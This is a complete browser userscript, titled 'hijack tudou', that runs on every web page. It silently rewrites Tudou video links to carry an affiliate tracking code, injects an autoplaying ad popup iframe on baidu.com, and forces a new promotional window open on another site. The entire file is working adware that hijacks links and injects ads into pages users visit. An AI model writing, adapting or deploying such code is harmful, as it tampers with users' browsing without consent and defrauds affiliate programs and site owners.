// ==UserScript==
// @name           hijack tudou
// @description    脚本的目的测试劫持土豆网主页链接
// @namespace      http://www.tudou.com
// @auth           break
// @version        1.0
// @license        Public Domain
// @include        http://*/*
// @require 	   http://code.jquery.com/jquery-1.8.0.min.js
// ==/UserScript==
(function() {
	var prevT;

	$.extend({
		//获取网页url的参数
		getVar: function(name, url) {
			var vars = [],
				hash;
			if ("undefined" == typeof url || url == "") {
				var url = window.location.href;
			}
			var hashes = url.slice(url.indexOf('?') + 1).split('&');
			for (var i = 0; i < hashes.length; i++) {
				hash = hashes[i].split('=');
				vars.push(hash[0]);
				vars[hash[0]] = hash[1];
			}
			if (typeof name != 'undefined') {
				return typeof vars[name] != 'undefined' ? vars[name] : 0;
			} else {
				return vars;
			}
		},
		//插入样式
		insertCss: function(cssText) {
			var cssNode = $.createElm('style', $("head").get(0));
			cssNode.type = 'text/css';
			cssNode.innerHTML = cssText;
		},
		//插入JS
		insertJS: function(jsText) {
			var jsNode = $.createElm('script', $("head").get(0));
			jsNode.innerHTML = jsText;
		},
		//导入JS
		importJS: function(jsFile) {
			var jsNode = $.createElm('script', $("head").get(0));
			jsNode.src = jsFile;
		},
		//创建元素
		createElm: function(tagname, destin) {
			var theElem = destin.appendChild(document.createElement(tagname));
			return theElem;
		},
		//广告弹窗
		adBox: function(src) {
			
			$.insertCss('#__adBox{ width:300px; height:200px; position:absolute; z-index:1000000; display:none;bottom:0px; right:300px;}#__adBox a{ position:absolute; top:0px; right:0px; color:#fff; height:30px; line-height:30px; font-size:12px; text-decoration:none; width:300px; text-align:right; background:rgba(0,0,0,0.5)}#__adBox h2{ font-size:24px; text-align:center; line-height:200px; font-family:"微软雅黑";}')
			$("body").append('<div id="__adBox"><a href="javaScript:void(0)" id="adBoxclose">关闭</a><iframe scrolling="no" frameborder="0" height="200" width="300" src="'+src+'"></iframe></div>');


			$("#__adBox").slideDown();

			$("#adBoxclose").live("click", function(){
	            $("#__adBox").slideUp();
	        });
		}
	});

	$(function() {
		setTimeout(

		function() {
			var host = window.location.host;
			var ts = document.evaluate('//a', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

			var code = "dW5pb25faWQ9MTMwMTIzXzIwMDAwMV8wMl8wMQ";
			for(var i = 0; i < ts.snapshotLength; i++) {
				var t = ts.snapshotItem(i);
				var href = t.getAttribute('href');
				//浏览器访问的页面里所有土豆播放页相关的链接都自动加上tpa
				if(href) {
					var m = href.match(/http\:\/\/www\.tudou\.com\/programs\/view\/(\S*)\//);
					console.log(m);

					tpa = "?tpa=" + code;

					if(m) {
						t.setAttribute('href', href + tpa);
					}
				}
			}

			//错误页面用插件植入JS，让JS弹窗显示推广页面
			if(host == "www.baidu.com") {
				ref = $.getVar("ref");
				//$.adBox("http://www.tudou.com/programs/view/LcYuoJtiiV0/?tpa=dW5pb25faWQ9MTMwMTIzXzIwMDAwMl8wMl8wMQ");
				$.adBox("http://www.tudou.com/v/2pUiwlm94uw/dW5pb25faWQ9MTMwMTIzXzIwMDAwNF8wMl8wMQ&autoPlay=true/v.swf");
			}

			//浏览器访问的指定页面植入JS，让JS新开一个窗口
			console.log(host);
			if(host == "www.whtbk.com") {
				window.open("http://www.tudou.com/v/2pUiwlm94uw/dW5pb25faWQ9MTMwMTIzXzIwMDAwN18wMl8wMQ&autoPlay=true/v.swf");
			}
		}, 1000);
	})


})();